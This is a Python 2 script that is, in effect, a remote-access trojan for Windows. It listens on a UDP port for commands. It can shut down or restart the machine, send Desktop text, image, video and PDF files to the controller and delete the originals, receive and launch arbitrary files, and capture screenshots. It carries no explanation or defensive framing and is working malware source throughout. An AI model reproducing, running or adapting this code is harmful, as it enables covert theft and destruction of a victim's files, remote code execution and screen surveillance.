import socket
import os
import base64
import glob
import random
import time
from PIL import ImageGrab

counter = 1

srv = socket .socket(socket.AF_INET , socket.SOCK_DGRAM)
port = 50013
srv.bind((socket.gethostbyname(socket.gethostname()),port))
print socket.gethostbyname(socket.gethostname())

username = os.environ["USERNAME"]
desktop_path = "C:/Users/"+username+"/Desktop"

text_list1 = glob.glob(desktop_path+"/*.txt")
text_list2 = glob.glob(desktop_path+"/*/*.txt")
text_list3 = glob.glob(desktop_path+"/*/*/*.txt")
text_list = text_list1 + text_list2 + text_list3


image_list1 = glob.glob(desktop_path+"/*.jpg")
image_list2 = glob.glob(desktop_path+"/*/*.jpg")
image_list3 = glob.glob(desktop_path+"/*/*/*.jpg")
image_list = image_list1 + image_list2 + image_list3


video_list1 = glob.glob(desktop_path+"/*.mp4")
video_list2 = glob.glob(desktop_path+"/*/*.mp4")
video_list3 = glob.glob(desktop_path+"/*/*/*.mp4")
video_list = video_list1 + video_list2 + video_list3


pdf_list1 = glob.glob(desktop_path+"/*.pdf")
pdf_list2 = glob.glob(desktop_path+"/*/*.pdf")
pdf_list3 = glob.glob(desktop_path+"/*/*/*.pdf")
pdf_list = pdf_list1 + pdf_list2 + pdf_list3


random_item_list = text_list + image_list + video_list + pdf_list

while True:
    data,address = srv.recvfrom(10000)
    print data
    if data == "shutdown":
        os.system("shutdown /s")
    if data == "restart":
        os.system("shutdown /r")

        
    if data == "cut_from":
        data,address = srv.recvfrom(1000)
        if data == "randomly":
            a = random.choice(random_item_list)
            if ".txt" in a:
                b = ".txt"
            elif ".jpg" in a:
                b = ".jpg"
            elif ".pdf" in a:
                b = ".pdf"
            elif ".mp4" in a:
                b = ".mp4"
            random_item = open(a , "rb")
            string_random = base64.b64encode(random_item.read())
            random_item.close()
            os.remove(a)
            l= len(string_random)
            begin = 0
            end = 10000
            if l < 10000:
                srv.sendto(string_random , address)
                time.sleep(3)
                srv.sendto("finish" + b , address)
                a = True
            else:
                while a:
                    send = string_random[begin:end+1]
                    srv.sendto(send , address)
                    begin = end + 1
                    end += 10000
                    if end > l - 1:
                        end = l - 1
                    if begin > l - 1:
                        srv.sendto("finish" + b , address)
                        a= False

        elif data == "regularly":
            data , address = srv.recvfrom(1000)
            if data == "text":
                if text_list != [] :
                    c = random.choice(text_list)
                    print c
                    random_text = open(c , "rb")
                    string_file = base64.b64encode(random_text.read())
                    random_text.close()
                    os.remove(c)
            elif data == "image":
                if image_list != [] :
                    d = random.choice(image_list)
                    print d
                    random_image = open(d , "rb")
                    string_file = base64.b64encode(random_image.read())
                    random_image.close()
                    os.remove(d)
            elif data == "video":
                if video_list != [] :
                    e = random.choice(video_list)
                    print e
                    random_video = open(e , "rb")
                    string_file = base64.b64encode(random_video.read())
                    random_video.close()
                    os.remove(e)
            elif data == "pdf":
                if pdf_list != [] :
                    f = random.choice(pdf_list)
                    print f
                    random_pdf = open(f , "rb")
                    string_file = base64.b64encode(random_pdf.read())
                    random_pdf.close()
                    os.remove(f)
                    
            l = len(string_file)
            begin = 0
            end = 10000
            a = True
            if l < 10000:
                srv.sendto(string_file , address)
                time.sleep(3)
                srv.sendto("finish", address)
            else:
                while a:
                    send = string_file[begin:end+1]
                    srv.sendto(send , address)
                    begin = end + 1
                    end += 10000
                    print end
                    if end > l - 1:
                        end = l - 1
                    if begin > l - 1:
                        srv.sendto("finish" , address)
                        a= False
 

    
    
    if data == "copy_to":
        final_file = ""
        data , address = srv.recvfrom(2000000)
        file_format = data
        not_done = True
        while not_done:
            data,address = srv.recvfrom(2000000)
            if 'finish' not in data :
                final_file += data
            if "finish" in data:
                not_done = False
                break
        new_file = open(str(counter) + file_format , "wb")
        new_file.write(final_file.decode("base64"))
        new_file.close()
        os.system("start "+ str(counter) + file_format)
        counter += 1


    if data == "screenshot":
        screen=ImageGrab.grab()
        screen.save("C:\Users\%s\Desktop\scr.jpg"%username)
        screen_forsend = open("C:\Users\%s\Desktop\scr.jpg"%username , "rb")
        screen_shot = base64.b64encode(screen_forsend.read())
        l = len(screen_shot)
        screen_forsend.close()
        begin = 0
        end = 10000
        a = True
        if len(screen_shot) < 10000:
            srv.sendto(screen_shot , address)
            time.sleep(3)
            srv.sendto("finish", address)
        else:
            while a:
                send = screen_shot[begin:end+1]
                srv.sendto(send , address)
                begin = end + 1
                end += 10000
                print end
                if end > l - 1:
                    end = l - 1
                if begin > l - 1:
                    srv.sendto("finish" , address)
                    a= False




        
